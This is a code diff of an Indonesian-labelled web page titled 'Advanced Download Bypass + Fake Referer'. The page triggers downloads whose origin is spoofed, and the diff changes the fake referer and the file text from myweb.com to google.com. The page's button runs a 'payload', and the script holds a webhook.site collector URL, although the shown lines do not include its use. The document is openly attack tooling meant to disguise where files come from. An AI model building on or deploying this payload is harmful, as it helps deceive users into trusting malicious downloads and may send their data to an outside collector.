@@ -10,12 +10,12 @@
 </head>
 <body>
     <h2>Advanced Download Bypass + Fake Referer</h2>
-    <p>File 1: From current domain<br>File 2: From myweb.com (spoofed)</p>
+    <p>File 1: From current domain<br>File 2: From google.com (spoofed)</p>
     <button onclick="executeBypass()">Jalankan Payload</button>
 
     <script>
         const WEBHOOK = "https://webhook.site/fd1f8ae0-9538-4102-9012-b6a41bbcfeb7";
-        const FAKE_REFERER = "https://myweb.com";
+        const FAKE_REFERER = "https://google.com";
 
         function downloadFile(filename, content) {
             const blob = new Blob([content], { type: 'text/plain' });
@@ -86,7 +86,7 @@
 
                             // Buat dan download file
                             setTimeout(() => {
-                                const blob = new Blob(['Ini adalah file kedua.\\n\\nDownload ini terlihat berasal dari myweb.com'], { type: 'text/plain' });
+                                const blob = new Blob(['Ini adalah file kedua.\\n\\nDownload ini terlihat berasal dari google.com'], { type: 'text/plain' });
                                 const url = URL.createObjectURL(blob);
                                 const a = document.createElement('a');
                                 a.href = url;
